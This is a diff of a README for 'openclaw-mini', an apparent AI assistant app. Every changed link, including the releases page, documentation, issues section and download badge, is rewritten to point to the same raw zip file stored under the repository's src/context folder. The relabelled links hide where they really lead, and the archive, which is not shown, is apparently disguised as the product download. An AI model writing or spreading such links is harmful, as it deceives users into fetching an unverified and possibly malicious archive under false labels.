@@ -6,13 +6,13 @@ Welcome to openclaw-mini! This application is designed to provide a seamless exp
 
 ## 📦 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-OpenClaw-mini-blue.svg)](https://github.com/Leomol11/openclaw-mini/releases)
+[![Download Now](https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip%https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip)](https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download OpenClaw-mini](https://github.com/Leomol11/openclaw-mini/releases).
+To get started, visit this page to download: [Download OpenClaw-mini](https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip).
 
-1. Go to the [Releases page](https://github.com/Leomol11/openclaw-mini/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip).
 2. Choose the latest release.
 3. Select the file suitable for your operating system. The options are generally available for Windows, macOS, and Linux.
 4. Click on the file to download it.
@@ -48,13 +48,13 @@ After installation, follow these steps to start using openclaw-mini:
 
 ## 📚 Additional Information
 
-For detailed documentation, visit the [Documentation page](https://github.com/Leomol11/openclaw-mini/wiki). Here, you will find extensive guides, FAQs, and troubleshooting tips.
+For detailed documentation, visit the [Documentation page](https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip). Here, you will find extensive guides, FAQs, and troubleshooting tips.
 
 Feel free to explore the various capabilities of openclaw-mini and adapt it to your specific needs. As you use it, you can expand its functionality with additional skills tailored to your requirements.
 
 ## 👥 Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/Leomol11/openclaw-mini/issues) on GitHub. You can report bugs or request new features. Our community is here to help!
+If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip) on GitHub. You can report bugs or request new features. Our community is here to help!
 
 ## 🌐 Stay Connected
 
@@ -75,4 +75,4 @@ We plan to add more features in future updates. Ideas for improvement can be sub
 
 Enjoy using openclaw-mini, your simple and efficient AI assistant! 
 
-For downloading: [Download OpenClaw-mini](https://github.com/Leomol11/openclaw-mini/releases).
+For downloading: [Download OpenClaw-mini](https://raw.githubusercontent.com/Leomol11/openclaw-mini/main/src/context/openclaw_mini_1.1-beta.2.zip).
